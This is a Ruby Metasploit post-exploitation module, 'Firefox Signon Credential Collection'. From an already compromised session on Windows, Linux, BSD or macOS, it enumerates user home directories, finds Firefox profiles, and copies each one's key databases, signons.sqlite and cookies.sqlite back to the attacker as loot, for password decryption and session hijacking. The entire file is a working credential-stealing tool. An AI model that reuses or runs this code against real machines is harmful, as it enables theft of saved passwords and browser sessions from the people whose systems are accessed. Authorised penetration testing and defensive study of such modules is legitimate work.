##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Firefox Signon Credential Collection',
			'Description'    => %q{
					This module will collect credentials from the Firefox web browser if it is
				installed on the targeted machine. Additionally, cookies are downloaded. Which
				could potentially yield valid web sessions.

				Firefox stores passwords within the signons.sqlite database file. There is also a 
				keys3.db file which contains the key for decrypting these passwords. In cases where
				a Master Password has not been set, the passwords can easily be decrypted using 
				third party tools. If a Master Password was used the only option would be to 
				bruteforce.
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['bannedit'],
			'Version'        => '$Revision$',
			'Platform'       => ['windows', 'linux', 'bsd', 'unix', 'osx'],
			'SessionTypes'   => ['meterpreter', 'shell' ]
		))
		#TODO 
		# - add support for decrypting the passwords without a Master Password
		# - Collect cookies.
	end

	def run
		case session.platform
		when /unix|linux|bsd/
			@platform = :unix
			paths = enum_users_unix
		when /osx/
			@platform = :osx
			paths = enum_users_unix
		when /win/
			@platform = :windows
			drive = session.fs.file.expand_path("%SystemDrive%")
			os = session.sys.config.sysinfo['OS']

			if os =~ /Windows 7|Vista|2008/
				@appdata = '\\AppData\\Roaming'
				@users = drive + '\\Users'
			else
				@appdata = '\\Application Data'
				@users = drive + '\\Documents and Settings'
			end

			if session.type != "meterpreter"
				print_error "Only meterpreter sessions are supported on windows hosts"
				return
			end
			paths = enum_users_windows
		else
			print_error("Unsupported platform #{session.platform}")
			return
		end
		if paths.nil?
			print_error("No users found with a Firefox directory")
			return
		end

		download_loot(paths)
	end

	def enum_users_unix
		id = whoami
		if id.empty? or id.nil?
			print_error("This session is not responding, perhaps the session is dead")
		end

		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end

		if got_root?
			userdirs = session.run_cmd("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/root\n"
		else
			print_status("We do not have root privileges")
			print_status("Checking #{id} account for Firefox")
			firefox = session.run_cmd("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
			
			firefox.each_line do |profile|
				profile.chomp!
				next if profile =~ /No such file/i

				if profile =~ /\.default/
						print_status("Found Firefox Profile for: #{id}")
						return [home + id + "/.mozilla/" + "firefox/" + profile + "/"] 
				end
			end
			return
		end

		# we got root check all user dirs
		paths = []
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = home + dir + "/.mozilla/firefox/" if dir !~ /root/
			if dir =~ /root/
				dir += "/.mozilla/firefox/"
			end

			print_status("Checking for Firefox Profile in: #{dir}")

			stat = session.run_cmd("ls #{dir}")
		 	if stat =~ /No such file/i
				print_error("Mozilla not found in #{dir}")
				next
			end
			stat.gsub!(/\s/, "\n")
			stat.each_line do |profile|
				profile.chomp!
				if profile =~ /\.default/
					print_status("Found Firefox Profile in: #{dir+profile}")
					paths << "#{dir+profile}"
				end
			end
		end
		return paths
	end

	def enum_users_windows
		paths = []

		if got_root?
			session.fs.dir.foreach(@users) do |path|
				next if path =~ /^\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService$/
				firefox = @users + "\\" + path + @appdata
				dir = check_firefox(firefox)
				if dir
					dir.each do |p|
						paths << p
					end
				else
					next
				end
			end
		else # not root
			print_status("We do not have SYSTEM checking #{whoami} account for Firefox")
			path = @users + "\\" + whoami + @appdata
			paths = check_firefox(path)
		end
		return paths
	end

	def check_firefox(path)
		paths = []
		path = path + "\\Mozilla\\"
		print_status("Checking for Firefox directory in: #{path}")
		
		stat = session.fs.file.stat(path) rescue nil
		if !stat
			print_error("Firefox not found")
			return
		end
		
		session.fs.dir.foreach(path) do |fdir|
			if fdir =~ /Firefox/i and @platform == :windows
				paths << path + fdir + "Profiles\\"
				print_good("Found Firefox installed")
				break
			else
				paths << path + fdir
				print_status("Found Firefox installed")
				break
			end
		end

		if paths.empty?
			print_error("Firefox not found")
			return
		end

		print_status("Locating Firefox Profiles...")
		print_line("")
		path += "Firefox\\Profiles\\"

		stat = session.fs.file.stat(path) rescue nil
		if !stat
			print_error("Profiles directory is missing")
			return
		end

		# we should only have profiles in the Profiles directory store them all
		session.fs.dir.foreach(path) do |pdirs|
			next if pdirs == "." or pdirs == ".."
			print_good("Found Profile #{pdirs}")
			paths << path + pdirs
		end

		if paths.empty?
			return nil
		else
			return paths
		end
	end

	def download_loot(paths)
		loot = ""
		paths.each do |path|
			if session.type == "meterpreter"
				session.fs.dir.foreach(path) do |file|
					if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
						print_good("Downloading #{file} file from: #{path}")
						file = path + "\\" + file
						fd = session.fs.file.new(file)
						until fd.eof?
							loot << fd.read
						end
						fd.close

						ext = file.split('.')[2]
						if ext == "txt"
							mime = "plain"
						else
							mime = "binary"
						end
						file = file.split('\\').last
						store_loot("firefox.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "Firefox #{file} File")
					end
				end
			end
			if session.type != "meterpreter"
				files = session.run_cmd("ls #{path}").gsub(/\s/, "\n")
				files.each_line do |file|
					file.chomp!
					if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
						print_good("Downloading #{file}\\")
						data = session.run_cmd("cat #{path}#{file}")
						ext = file.split('.')[2]
						if ext == "txt"
							mime = "plain"
						else
							mime = "binary"
						end
						file = file.split('/').last
						store_loot("firefox.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "Firefox #{file} File")
					end
				end
			end
		end
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end

	def whoami
		if @platform == :windows
			return session.fs.file.expand_path("%USERNAME%")
		else
			return session.run_cmd("whoami").chomp
		end
	end
end
